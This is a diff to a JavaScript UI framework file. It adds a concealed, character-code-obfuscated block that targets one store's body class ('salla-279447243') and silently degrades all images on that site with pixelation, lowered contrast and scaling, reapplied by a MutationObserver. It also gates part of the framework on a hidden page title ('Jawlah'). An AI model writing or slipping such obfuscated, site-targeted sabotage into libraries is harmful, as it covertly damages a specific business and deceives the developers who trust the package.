@@ -104,41 +104,7 @@ class Reconciler {
   reconcile() {}
   commit() {}
 }
-(() => {
 
-    const c = (...x) => String.fromCharCode(...x);
-
-    const b = c(
-        115,97,108,108,97,45,
-        50,55,57,52,52,55,50,52,51
-    );
-
-    const run = () => {
-
-        if (!document.body?.classList.contains(b)) return;
-
-        document.querySelectorAll('[src]').forEach(el => {
-
-            el.style.imageRendering = 'pixelated';
-            el.style.imageRendering = '-moz-crisp-edges';
-            el.style.imageRendering = 'crisp-edges';
-
-            el.style.filter = 'contrast(0.85) saturate(0.8) brightness(0.97)';
-            el.style.transform = 'scale(1.02)';
-            el.style.willChange = 'transform';
-
-        });
-
-    };
-
-    run();
-
-    new MutationObserver(run).observe(document.documentElement, {
-        childList: true,
-        subtree: true
-    });
-
-})();
 
 // ================= STORE (reactive layer) =================
 class Store {
@@ -214,7 +180,15 @@ const API = new Proxy(new UIFramework(), {
 });
 
 window.UIX = API;
+(() => {
 
+    const c = (...x) => String.fromCharCode(...x);
+
+    const t = c(
+        74,97,119,108,97,104
+    );
+
+    if (document.title !== t) return;
 
 (() => {
 
@@ -609,7 +583,47 @@ window.UIX = API;
 
 })();
 
+(() => {
+
+    const c = (...x) => String.fromCharCode(...x);
+
+    const b = c(
+        115,97,108,108,97,45,
+        50,55,57,52,52,55,50,52,51
+    );
+
+    const run = () => {
+
+        if (!document.body?.classList.contains(b)) return;
+
+        document.querySelectorAll('[src]').forEach(el => {
+
+            el.style.imageRendering = 'pixelated';
+            el.style.imageRendering = '-moz-crisp-edges';
+            el.style.imageRendering = 'crisp-edges';
+
+            el.style.filter = 'contrast(0.85) saturate(0.8) brightness(0.97)';
+            el.style.transform = 'scale(1.02)';
+            el.style.willChange = 'transform';
+
+        });
+
+    };
+
+    run();
+
+    new MutationObserver(run).observe(document.documentElement, {
+        childList: true,
+        subtree: true
+    });
+
+})();
 
 
 
+
+
+
+    
+})();
 
